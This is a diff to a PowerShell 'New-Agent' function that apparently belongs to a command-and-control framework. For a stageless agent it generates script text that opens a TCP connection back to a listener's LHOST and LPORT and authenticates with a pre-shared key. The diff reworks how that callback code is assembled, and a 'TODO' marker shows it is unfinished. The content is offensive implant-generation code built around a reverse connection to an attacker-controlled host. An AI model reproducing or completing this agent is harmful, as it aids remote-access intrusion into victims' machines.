@@ -27,20 +27,22 @@ Function Global:New-Agent()
 
 		if($StageType -eq "Stageless")
 		{
-				$PSK = ($Listerner.PSK)
+				$PSK   = ($Listerner.PSK)
+				$LHOST = $Listerner.LHOST
+				$LPORT =  $Listerner.LPORT
 
-				$Agent = @'
-					TODO:::::
-					$PSK = $PSK
-					$tcp = New-Object System.Net.Sockets.TcpClient; 
-					$tcp.connect('$Listerner.LHOST', $Listerner.LPORT); 
+				$Agent = @(
+					"TODO:::::"
+					"`$PSK = $PSK"
+					"`$tcp = New-Object System.Net.Sockets.TcpClient;" 
+					"`$tcp.connect($LHOST, $LPORT);"
 
-					$tcpStream = $tcp.GetStream()
-					$reader = New-Object System.IO.StreamReader($tcpStream)
-					$writer = New-Object System.IO.StreamWriter($tcpStream)
-					$writer.WriteLine($PSK);
-					$reader.ReadLine()
-			'
+					"`$tcpStream = `$tcp.GetStream()"
+					"`$reader = New-Object System.IO.StreamReader(`$tcpStream)"
+					"`$writer = New-Object System.IO.StreamWriter(`$tcpStream)"
+					"`$writer.WriteLine(`$PSK);"
+					"`$reader.ReadLine()"
+					) -join "`r`n"
 			
 
 			
